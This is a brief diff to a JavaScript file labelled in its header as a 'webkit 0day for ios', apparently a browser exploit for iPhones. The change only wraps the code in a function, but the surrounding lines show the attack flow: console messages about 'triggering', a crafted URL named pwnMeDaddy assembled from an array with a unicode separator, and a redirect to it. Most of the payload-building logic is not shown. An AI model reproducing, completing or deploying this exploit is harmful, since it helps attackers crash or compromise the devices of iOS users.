@@ -3,7 +3,7 @@
   webkit 0day for ios
   GPLV2
 */
-
+function go() {
 console.log("[*] init");
 console.log("[*] guessing OUM");
 
@@ -37,3 +37,4 @@ var pwnMeDaddy = location.protocol + (pwnArray.toString().split(",").join("\u034
 console.log("[*] triggering. goodbye!");
 location.href = pwnMeDaddy;
 console.log("[*] theoretically triggered. done");
+}
